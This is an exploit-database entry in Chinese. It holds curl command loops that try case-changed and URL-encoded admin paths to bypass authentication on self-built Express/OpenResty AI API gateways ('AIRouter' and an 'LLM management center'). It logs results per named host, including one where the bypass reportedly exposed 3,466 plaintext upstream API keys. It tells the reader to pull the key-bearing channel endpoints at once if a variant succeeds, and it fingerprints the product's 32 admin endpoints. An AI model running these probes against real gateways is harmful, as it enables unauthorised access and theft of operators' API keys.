# AIRouter 白标 AI 网关：管理面鉴权绕过尝试集（/API/ 大小写 + /admin%2Ehtml 编码变体）与被证伪的迁移性

- **code**: airouter-白标-ai-网关-管理面鉴权绕过尝试集-api-大小写-admin-2ehtml-编码变体-与被证伪的迁移性
- **kind**: payload
- **category**: auth-bypass
- **component**: AIRouter（自研 AI API 包月/白标网关，Express + OpenResty）
- **severity**: medium
- **language**: http
- **source**: self
- **verified_note**: 本条为**证伪型**成果，非可直接利用的 EXP。实测记录：在 example.com、okapi-good.example.org、okapi.example.com、okapi-good.example.com、api2.gemiaude.com、api.gemiaude.com 共 6 台上，第 1 节全部绕过变体对管理 API 均返回 401 {"success":false,"error":"Authentication required"}（首测于 2026-09-28）；/admin.html、/admin%2Ehtml、/admin%252Ehtml、/./admin.html、//admin.html 返回 200/49282B 管理前端（静态壳，接口仍需鉴权）。同一清单在 203.0.113.118:13030 上成立（已知成果，父会话入库）。故 verified=false 表示"绕过在本产品上不成立"。
- **path**: pocs/airouter-白标-ai-网关-管理面鉴权绕过尝试集-api-大小写-admin-2ehtml-编码变体-与被证伪的迁移性/poc.http
- **tags**: express,鉴权绕过,case-sensitive,url-encoding,airouter,白标网关,证伪,判别清单
- **created_at**: 2026-09-28T03:39:06.308Z
- **found_by**: exploit

## 描述

用途：快速判定一台 Express 自研网关的管理面是否存在"鉴权中间件与路由对 req.path 的判定不一致"（大小写敏感前缀匹配 vs Express 默认 caseSensitive:false + URL 解码）。**本条目是"证伪优先"的判别清单**：同一运营方的另一台（203.0.113.118:13030 "LLM 管理中心"）该缺陷成立并泄露全部上游密钥；而 AIRouter 系列 6 台同族主机实测**不成立**，故不可假定同运营方代码即同缺陷——换目标必须先跑此清单。
产物两条：(1) 绕过验证清单（要试的变体）；(2) AIRouter 产品的真实结构指纹（用于识别"不是 13030 同款"，避免在死路上耗时间）。

## 用法

```
# 第一步：判定是否 LLM 管理中心同款（同款才值得套 13030 的绕过）
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.52 Safari/537.36'
for p in /login.html /admin.html /assets/pages/index.js /api/auth/login; do
  curl -k -s -o /dev/null -D - --noproxy "*" -A "$UA" "https://TARGET$p" | head -1
done
# AIRouter 特征：无 /login.html(302→/) 无 /assets/pages/*.js 无 /api/auth/login(302)；
#                首页 <title>…</title> + 引用根路径 styles.css / admin-styles.css / example.com / common.js
#                首页 21164B(okapi 系) / 21066B(gemiaude 系)

# 第二步：绕过变体清单（逐个 GET，-o /dev/null -w '%{http_code}'）
for p in \
  /api/admin/models /API/admin/models /Api/admin/models /aPI/admin/models \
  /api/ADMIN/models /API/ADMIN/MODELS /api/admin/models/ \
  /api/admin/models%20 /api/admin/models/..;/ /api//admin/models \
  /api/./admin/models /api/admin//models /api/%61dmin/models \
  /admin.html /admin%2Ehtml /admin%252Ehtml /./admin.html //admin.html /admin.html/../admin.html \
  /admin.html..;/ /admin.html%00 /admin.html/ /ADMIN.HTML ; do
  echo -n "$p -> "; curl -k -s -o /dev/null -w '%{http_code}\n' --noproxy "*" -A "$UA" "https://TARGET$p"
done
# 判读：管理层 API 返 401/403 = 鉴权正确（本产品即如此）；
#       返 200 且带业务 JSON = 绕过成立，立即 GET /API/admin/channels 类接口取上游密钥。
# 注意：302 Location: / 是全局兜底（未命中路由），**不是绕过成功**，不要误记。

# 方法变换
curl -k -s -o /dev/null -w 'HEAD %{http_code}\n' -X HEAD --noproxy "*" -A "$UA" "https://TARGET/api/admin/models"
curl -k -s -o /dev/null -w 'OPTIONS %{http_code}\n' -X OPTIONS --noproxy "*" -A "$UA" "https://TARGET/api/admin/models"

# 环境坑
# · 经 Cloudflare 的域名走代理须带浏览器 UA（否则 403 error code: 1010）；直连 IP 必须 --noproxy "*"
# · CF 判定看响应头是否含 Cf-Ray / Server: cloudflare；本目标群为 OpenResty 直连，无 CF
```

## 正文

```
## 一、绕过验证清单（要试的变体）

对照组（必须先是 401，否则说明压根没鉴权，更直接）：
  GET /api/admin/channel-types          → 401
绕过组：
  GET /API/admin/channel-types          → 13030 上 200
  GET /API/admin/channels               → 13030 上 200，105 渠道 / 3466 明文上游密钥
  GET /API/admin/stats | settings | generations | request-logs
  GET /admin.html                       → 302 跳登录
  GET /admin%2Ehtml                     → 13030 上 200，完整管理前端
  GET /admin%2ehtml | /admin.htm%6c | /admin.html%00 | //admin.html | /./admin.html
  GET /Api/admin/* | /aPI/admin/* | /API/ADMIN/*
路径归一化：%20 后缀、/..;/、//、/%61dmin/、/./  —— 落到 302 兜底即未命中，非绕过。
方法变换：HEAD / OPTIONS / 尾斜杠。

## 二、判定表（实测证据）

| 目标 | 产品 | /API/ 大小写绕过 | /admin%2Ehtml | 上游密钥 |
|---|---|---|---|---|
| 203.0.113.118:13030 | LLM 管理中心 | **成立**（200） | **成立**（200，管理前端） | **3466 条明文（3171 OpenRouter）** |
| example.com / okapi.example.com / api.gemiaude.com（203.0.113.117） | AIRouter | **不成立**（401） | 200 但仅前端壳，接口 401 | 未取到 |
| okapi-good.example.org / okapi-good.example.com（203.0.113.20） | AIRouter | **不成立**（401） | 同上 | 未取到 |
| api2.gemiaude.com（203.0.113.109） | AIRouter | **不成立**（401） | 同上 | 未取到 |

## 三、AIRouter 产品结构指纹（用于识别"非 13030 同款"）

- 响应头：`Server: openresty` + `X-Powered-By: Express` + helmet 全套安全头
  （Cross-Origin-Opener-Policy / Cross-Origin-Resource-Policy / Origin-Agent-Cluster /
   Referrer-Policy: no-referrer / Strict-Transport-Security / X-Content-Type-Options: nosniff /
   X-DNS-Prefetch-Control: off / X-Download-Options: noopen / X-Frame-Options: SAMEORIGIN /
   X-Permitted-Cross-Domain-Policies: none / X-XSS-Protection: 0 / Vary: Origin, Accept-Encoding /
   Access-Control-Allow-Credentials: true）
- 前端：根路径 `styles.css` / `admin-styles.css` / `example.com` / `common.js`；
  `<title>Admin - AIRouter</title>`；版本参数 `?v=20260802-toolpage-refine`、
  `example.com?v=20260924-forbidden-keys`
- **不存在**（与 13030 的关键差异）：`/login.html`、`/assets/pages/*.js`、`/api/admin/channel-types`
- 唯一未授权读点：`GET /api/config`（白标品牌配置）+ 静态 `/admin.html`（管理前端壳）
- 管理接口清单（32 个，全需 `Authorization: Bearer`，token 由 `POST /api/admin/auth` 下发并
  存于 sessionStorage）：
  `/api/admin/{auth,models,system,logs,renewals,users,sensitive-config}`、
  `/api/admin/apikeys{/generate,/import,/reload,/add-days,/replace-tagged,/replace-tagged/preview}`、
  `/api/admin/forbidden-keys{/check,/forbid,/reload,/unforbid}`、
  `/api/admin/ip-blacklist{/add,/reload,/remove}`、`/api/admin/whitelist{/add,/remove}`、
  `/api/admin/compensation{/create,/execute,/list,/detail,/search}`、
  `/api/admin/order-logs{/recent,/transaction/}`
- `GET /api/admin/sensitive-config?reveal=1` 是最有诱惑力的读点（reveal 开关），但未授权一律 401。

## 四、结论

**"同运营方 / 同类型中转站 ⇒ 同一份自研代码 ⇒ 同一绕过"这个推断在本例被证伪**：
13030 是 Node 自研"LLM 管理中心"（中间件用大小写敏感未解码 `req.path`，Express 路由
`caseSensitive:false` 且先解码 → 判定不一致）；AIRouter 系列 6 台是该运营方另一条产品线
（白标包月网关），鉴权中间件实现正确。跨目标复用绕过前，必须先跑第一节的对照组。
```
